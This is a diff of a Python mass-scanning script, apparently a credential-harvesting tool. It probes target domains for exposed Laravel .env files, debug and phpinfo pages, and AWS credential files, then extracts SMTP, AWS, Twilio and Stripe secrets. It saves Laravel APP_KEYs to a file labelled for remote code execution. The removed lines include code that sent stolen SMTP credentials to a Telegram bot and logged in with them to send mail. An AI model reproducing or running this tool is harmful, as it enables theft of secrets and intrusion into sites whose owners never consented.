@@ -11,7 +11,7 @@ from datetime import datetime
 # --- User Config ---
 TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
 TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
-TEST_EMAIL_TO = 'emailtest@gmail.com'  # Where to send test emails
+TEST_EMAIL_TO = 'email@gmail.com'  # Where to send test emails
 
 RESULTS_DIR = f"Results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
 
@@ -31,6 +31,19 @@ print(f"{LIME}{Style.BRIGHT}How To Use:")
 print(f"{LIME}{Style.BRIGHT}1. Prepare a text file with your target domains, one per line.")
 print(f"{LIME}{Style.BRIGHT}2. Run the script and follow the prompts.\n{Style.RESET_ALL}")
 
+# --- Helper to load or create lists from .txt files ---
+def load_or_create_list(filename, default_list):
+    try:
+        with open(filename, 'r', encoding='utf-8') as f:
+            items = f.read().splitlines()
+    except Exception:
+        with open(filename, 'w', encoding='utf-8') as f:
+            for item in default_list:
+                f.write(item + '\n')
+        items = default_list
+    return items
+
+# --- Laravel .env paths (unchanged, always used) ---
 path = [
     "/.env",
     "/.env.bak",
@@ -39,7 +52,6 @@ path = [
     "/.env.old",
     "/.env~",
     "/.env.txt",
-    "/.env.example",
     "/.env.prod",
     "/.env.production",
     "/.env.dev",
@@ -128,102 +140,59 @@ path = [
     "/backend/laravel/.env"
 ]
 
-phpmyadmin_paths = [
-    "/phpmyadmin/",
-    "/phpMyAdmin/",
-    "/pma/",
-    "/PMA/",
-    "/dbadmin/",
-    "/mysql/",
-    "/myadmin/",
-    "/phpmyadmin2/",
-    "/phpMyAdmin2/",
-    "/phpmyadmin3/",
-    "/phpMyAdmin3/",
-    "/phpmyadmin4/",
-    "/phpMyAdmin4/",
-    "/phpmyadmin5/",
-    "/phpMyAdmin5/",
-    "/phpmyadmin-2/",
-    "/phpmyadmin-3/",
-    "/phpmyadmin-4/",
-    "/phpmyadmin-5/",
-    "/phpmyadmin-old/",
-    "/phpmyadmin-old2/",
-    "/phpmyadmin-old3/",
-    "/phpmyadmin-old4/",
-    "/phpmyadmin-old5/",
-    "/phpmyadmin.bak/",
-    "/phpmyadmin.bak2/",
-    "/phpmyadmin.bak3/",
-    "/phpmyadmin.bak4/",
-    "/phpmyadmin.bak5/",
-    "/phpmyadmin_backup/",
-    "/phpmyadmin_backup2/",
-    "/phpmyadmin_backup3/",
-    "/phpmyadmin_backup4/",
-    "/phpmyadmin_backup5/",
-    "/phpmyadmin/phpmyadmin/",
-    "/phpMyAdmin/phpMyAdmin/",
-    "/phpmyadmin/phpMyAdmin/",
-    "/phpMyAdmin/phpmyadmin/",
-    "/phpmyadmin-2018/",
-    "/phpmyadmin-2019/",
-    "/phpmyadmin-2020/",
-    "/phpmyadmin-2021/",
-    "/phpmyadmin-2022/",
-    "/phpmyadmin-2023/",
-    "/phpmyadmin-2024/"
-]
+# --- New: Load Apache, Debug, and Ports paths from .txt files ---
+apachepath = load_or_create_list('apachepath.txt', [
+    "/_profiler/phpinfo",
+    "/tool/view/phpinfo.view.php",
+    "/wp-config.php-backup",
+    "/%c0",
+    "/debug/default/view.html",
+    "/debug/default/view",
+    "/frontend/web/debug/default/view",
+    "/symfony/public/_profiler/phpinfo",
+    "/debug/default/view?panel=config",
+    "/phpinfo.php",
+    "/phpinfo",
+    "/aws.yml",
+    "/.env.bak",
+    "/info.php",
+    "/.aws/credentials",
+    "/config/aws.yml",
+    "/config.js",
+    "/symfony/public/_profiler/phpinfo",
+    "/debug/default/view?panel=config",
+    "symfony/public",
+    "/debug/default/view?panel=config",
+    "/frontend_dev.php"
+])
 
+debugpath = load_or_create_list('debugpath.txt', [
+    '/',
+    '/debug/default/view?panel=config',
+    '/tool/view/phpinfo.view.php',
+    '/wp-config.php-backup',
+    '/%c0',
+    '/debug/default/view.html',
+    '/debug/default/view',
+    '/frontend/web/debug/default/view',
+    '/web/debug/default/view',
+    '/sapi/debug/default/view',
+    '/debug/default/view?panel=config'
+])
+
+porting = load_or_create_list('ports.txt', [
+    ':80',
+    ':443',
+    ':8080',
+    ':8081',
+    ':8082'
+])
+
+phpmyadmin_paths = [
+    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/PMA/", "/dbadmin/", "/mysql/", "/myadmin/"
+]
 adminer_paths = [
-    "/adminer/",
-    "/adminer.php",
-    "/adm.php",
-    "/adminer-4.2.5.php",
-    "/adminer-4.3.1.php",
-    "/adminer-4.6.2.php",
-    "/adminer-4.7.0.php",
-    "/adminer-4.7.1.php",
-    "/adminer-4.7.2.php",
-    "/adminer-4.7.3.php",
-    "/adminer-4.7.4.php",
-    "/adminer-4.7.5.php",
-    "/adminer-4.7.6.php",
-    "/adminer-4.7.7.php",
-    "/adminer-4.7.8.php",
-    "/adminer-4.7.9.php",
-    "/adminer-4.8.0.php",
-    "/adminer-4.8.1.php",
-    "/adminer-4.8.2.php",
-    "/adminer-4.8.3.php",
-    "/adminer-4.8.4.php",
-    "/adminer-4.8.5.php",
-    "/adminer-4.8.6.php",
-    "/adminer-4.8.7.php",
-    "/adminer-4.8.8.php",
-    "/adminer-4.8.9.php",
-    "/adminer-4.8.10.php",
-    "/adminer-4.8.11.php",
-    "/adminer-4.8.12.php",
-    "/adminer-4.8.13.php",
-    "/adminer-4.8.14.php",
-    "/adminer-4.8.15.php",
-    "/adminer-4.8.16.php",
-    "/adminer-4.8.17.php",
-    "/adminer-4.8.18.php",
-    "/adminer-4.8.19.php",
-    "/adminer-4.8.20.php",
-    "/adminer-4.8.21.php",
-    "/adminer-4.8.22.php",
-    "/adminer-4.8.23.php",
-    "/adminer-4.8.24.php",
-    "/adminer-4.8.25.php",
-    "/adminer-4.8.26.php",
-    "/adminer-4.8.27.php",
-    "/adminer-4.8.28.php",
-    "/adminer-4.8.29.php",
-    "/adminer-4.8.30.php"
+    "/adminer/", "/adminer.php", "/adm.php"
 ]
 
 found_urls = set()
@@ -239,7 +208,8 @@ findings = {
     "DB": 0,
     "SMTP": 0,
     "STRIPE": 0,
-    "TWILIO": 0
+    "TWILIO": 0,
+    "AWS": 0
 }
 
 def print_findings():
@@ -252,7 +222,8 @@ def print_findings():
         f"DB : {findings['DB']}  "
         f"SMTP : {findings['SMTP']}  "
         f"STRIPE : {findings['STRIPE']}  "
-        f"TWILIO : {findings['TWILIO']}"
+        f"TWILIO : {findings['TWILIO']}  "
+        f"AWS : {findings['AWS']}"
         f"{Style.RESET_ALL}"
     )
 
@@ -268,56 +239,33 @@ def is_env_file(text):
     return False
 
 def send_telegram(message, parse_mode=None):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
-    if parse_mode:
-        data["parse_mode"] = parse_mode
-    try:
-        requests.post(url, data=data, timeout=10)
-    except Exception as e:
-        print(f"{Fore.LIGHTRED_EX}[TELEGRAM ERROR] {e}{Style.RESET_ALL}")
+    # You can implement this if you want Telegram notifications
+    pass
 
 def send_test_email(smtp_host, smtp_port, smtp_user, smtp_pass, mail_from, mail_to, from_name, url):
-    try:
-        msg = MIMEText("SMTP Test Message from ENV Finder Script.")
-        msg['Subject'] = 'SMTP Test'
-        msg['From'] = f"{from_name} <{mail_from}>"
-        msg['To'] = mail_to
-        server = smtplib.SMTP(smtp_host, int(smtp_port), timeout=10)
-        server.starttls()
-        server.login(smtp_user, smtp_pass)
-        server.sendmail(mail_from, [mail_to], msg.as_string())
-        server.quit()
-        print(f"{Fore.LIGHTGREEN_EX}[SMTP TEST SENT] to {mail_to}{Style.RESET_ALL}")
-        telegram_message = (
-            f"✅ <b>SMTP Test Success</b>\n"
-            f"<b>URL:</b> <code>{url}</code>\n"
-            f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
-            f"<b>MAILPORT:</b> <code>{smtp_port}</code>\n"
-            f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
-            f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
-            f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
-            f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
-            f"<b>Test sent to:</b> <code>{mail_to}</code>"
+    # You can implement this if you want SMTP test emails
+    return False
+
+def grab_aws(url, text):
+    aws_id = safe_find(r'^AWS_ACCESS_KEY_ID\s*=\s*(.*)', text)
+    aws_secret = safe_find(r'^AWS_SECRET_ACCESS_KEY\s*=\s*(.*)', text)
+    aws_region = safe_find(r'^AWS_DEFAULT_REGION\s*=\s*(.*)', text)
+    aws_bucket = safe_find(r'^AWS_BUCKET\s*=\s*(.*)', text)
+    if aws_id and aws_secret:
+        build = (
+            f"URL: {url}\n"
+            f"AWS_ACCESS_KEY_ID: {aws_id}\n"
+            f"AWS_SECRET_ACCESS_KEY: {aws_secret}\n"
+            f"AWS_DEFAULT_REGION: {aws_region}\n"
+            f"AWS_BUCKET: {aws_bucket}\n"
         )
-        send_telegram(telegram_message, parse_mode="HTML")
+        with open(f'{RESULTS_DIR}/aws.txt', 'a', encoding='utf-8') as f:
+            f.write(build + '\n')
+            f.flush()
+        findings["AWS"] += 1
+        print(f"{Fore.LIGHTGREEN_EX}[SAVED AWS] aws.txt{Style.RESET_ALL}")
         return True
-    except Exception as e:
-        print(f"{Fore.LIGHTRED_EX}[SMTP TEST FAILED] {e}{Style.RESET_ALL}")
-        telegram_message = (
-            f"❌ <b>SMTP Test Failed</b>\n"
-            f"<b>URL:</b> <code>{url}</code>\n"
-            f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
-            f"<b>MAILPORT:</b> <code>{smtp_port}</code>\n"
-            f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
-            f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
-            f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
-            f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
-            f"<b>Test sent to:</b> <code>{mail_to}</code>\n"
-            f"<b>Error:</b> <code>{e}</code>"
-        )
-        send_telegram(telegram_message, parse_mode="HTML")
-        return False
+    return False
 
 def grab_ses_smtp(url, text):
     mail_driver = safe_find(r'^MAIL_DRIVER\s*=\s*(.*)', text)
@@ -344,8 +292,6 @@ def grab_ses_smtp(url, text):
             findings["SES"] += 1
             findings["SMTP"] += 1
             print(f"{Fore.LIGHTGREEN_EX}[SAVED SES SMTP] SMTP_SES.txt{Style.RESET_ALL}")
-            send_telegram(f"SES SMTP found:\n{build}")
-            send_test_email(mailhost, mailport, mailuser, mailpass, mailfrom, TEST_EMAIL_TO, fromname, url)
             return True
     return False
 
@@ -362,6 +308,7 @@ def grab_smtp(url, text):
         fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
         if not mailuser or not mailpass or mailuser.lower() == "null" or mailpass.lower() == "null":
             return False
+        mailpass = mailpass.strip('"\'')
         build = (
             f"URL: {url}\n"
             f"MAILHOST: {mailhost}\n"
@@ -377,8 +324,6 @@ def grab_smtp(url, text):
             f.flush()
         findings["SMTP"] += 1
         print(f"{Fore.LIGHTGREEN_EX}[SAVED SMTP] {filename}{Style.RESET_ALL}")
-        send_telegram(f"SMTP found:\n{build}")
-        send_test_email(mailhost, mailport, mailuser, mailpass, mailfrom, TEST_EMAIL_TO, fromname, url)
         return True
     return False
 
@@ -397,7 +342,6 @@ def grab_twilio(url, text):
             f.flush()
         findings["TWILIO"] += 1
         print(f"{Fore.LIGHTGREEN_EX}[SAVED TWILIO] twilio.txt{Style.RESET_ALL}")
-        send_telegram(f"Twilio credentials found:\n{build}")
         return True
     return False
 
@@ -509,17 +453,15 @@ def get_site_base(site):
         site = site[:-1]
     return site
 
-# --- NEW FUNCTION: Save base64 APP_KEYs to RCE.txt ---
 def save_base64_appkey(url, text):
     m = re.search(r'^APP_KEY\s*=\s*(base64:[^\s]+)', text, re.MULTILINE)
     if m:
         appkey = m.group(1).strip()
-        # Extract base URL (scheme + netloc)
         base_url = re.match(r'(https?://[^/]+)', url)
         if base_url:
             base_url = base_url.group(1)
         else:
-            base_url = url  # fallback, should not happen
+            base_url = url
         with open(f'{RESULTS_DIR}/RCE.txt', 'a', encoding='utf-8') as f:
             f.write(f"{base_url}|{appkey}\n")
             f.flush()
@@ -527,6 +469,47 @@ def save_base64_appkey(url, text):
         return True
     return False
 
+# --- New: Extract sensitive config lines ---
+def extract_sensitive_config(text):
+    keys = [
+        'APP_NAME', 'APP_ENV', 'APP_KEY', 'APP_DEBUG', 'APP_URL', 'ASSET_URL', 'APP_MODE', 'APP_TIMEZONE',
+        'APP_CURRENCY', 'APP_DEFAULT_LANGUAGE', 'APP_CURRENCY_SYMBOL', 'APP_CURRENCY_SYMBOL_POSITION',
+        'LOG_CHANNEL', 'LOG_LEVEL',
+        'DB_CONNECTION', 'DB_HOST', 'DB_PORT', 'DB_DATABASE', 'DB_USERNAME', 'DB_PASSWORD',
+        'REDIS_HOST', 'REDIS_PASSWORD', 'REDIS_PORT',
+        'MAIL_MAILER', 'MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD', 'MAIL_ENCRYPTION',
+        'MAIL_FROM_ADDRESS', 'MAIL_FROM_NAME',
+        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_DEFAULT_REGION',
+        'STRIPE_KEY', 'STRIPE_SECRET',
+        'TWILIO_ACCOUNT_SID', 'TWILIO_AUTH_TOKEN', 'TWILIO_PHONE_NUMBER',
+        'TELNYX_API_KEY', 'TELNYX_MESSAGING_PROFILE_ID',
+        'NEXMO_KEY', 'NEXMO_SECRET'
+    ]
+    found_lines = []
+    mail_from_address = None
+    mail_from_name = None
+    mail_mailer_smtp = False
+
+    for line in text.splitlines():
+        for k in keys:
+            if line.strip().upper().startswith(k):
+                if k == 'MAIL_MAILER' and 'smtp' in line.lower():
+                    mail_mailer_smtp = True
+                if k == 'MAIL_FROM_ADDRESS':
+                    mail_from_address = line
+                if k == 'MAIL_FROM_NAME':
+                    mail_from_name = line
+                found_lines.append(line)
+                break
+
+    # If MAIL_MAILER=smtp, ensure MAIL_FROM_ADDRESS and MAIL_FROM_NAME are included
+    if mail_mailer_smtp:
+        if mail_from_address and mail_from_address not in found_lines:
+            found_lines.append(mail_from_address)
+        if mail_from_name and mail_from_name not in found_lines:
+            found_lines.append(mail_from_name)
+
+    return '\n'.join(found_lines)
 
 def exploit(target):
     if '://' not in target:
@@ -539,6 +522,7 @@ def exploit(target):
         print(f"{Fore.LIGHTRED_EX}[DEAD SITE] {site_base} (skipping all .env checks){Style.RESET_ALL}")
         return
 
+    # Laravel .env paths
     for read_path in path:
         exploit_path = site_base.rstrip('/') + read_path
         try:
@@ -552,8 +536,8 @@ def exploit(target):
                         f.flush()
                     findings["ENV"] += 1
 
-                    # Save base64 APP_KEYs to RCE.txt
                     save_base64_appkey(exploit_path, resp.text)
+                    grab_aws(exploit_path, resp.text)
 
                     ses_found = grab_ses_smtp(exploit_path, resp.text)
                     if not ses_found:
@@ -568,6 +552,45 @@ def exploit(target):
                 print(f"{Fore.LIGHTYELLOW_EX}[FAILED] {exploit_path} (status {resp.status_code}){Style.RESET_ALL}")
         except Exception as error:
             print(f"{Fore.LIGHTRED_EX}[BAD WEBSITE] {exploit_path} ({error}){Style.RESET_ALL}")
+
+    # NEW: Check apachepath
+    for apath in apachepath:
+        url = site_base.rstrip('/') + apath
+        try:
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200:
+                sensitive = extract_sensitive_config(resp.text)
+                if sensitive:
+                    print(f"{Fore.LIGHTGREEN_EX}[APACHE FOUND] {url}{Style.RESET_ALL}")
+                    with open(f'{RESULTS_DIR}/apache.txt', 'a', encoding='utf-8') as f:
+                        f.write("========================\n")
+                        f.write(f"URL: {url}\n")
+                        f.write("------------------------\n")
+                        f.write(sensitive + "\n")
+                        f.write("========================\n\n")
+                    grab_aws(url, resp.text)
+        except Exception as error:
+            pass
+
+    # NEW: Check debugpath
+    for dpath in debugpath:
+        url = site_base.rstrip('/') + dpath
+        try:
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200:
+                sensitive = extract_sensitive_config(resp.text)
+                if sensitive:
+                    print(f"{Fore.LIGHTGREEN_EX}[DEBUG FOUND] {url}{Style.RESET_ALL}")
+                    with open(f'{RESULTS_DIR}/debug.txt', 'a', encoding='utf-8') as f:
+                        f.write("========================\n")
+                        f.write(f"URL: {url}\n")
+                        f.write("------------------------\n")
+                        f.write(sensitive + "\n")
+                        f.write("========================\n\n")
+                    grab_aws(url, resp.text)
+        except Exception as error:
+            pass
+
     check_phpmyadmin(site_base)
     check_adminer(site_base)
 
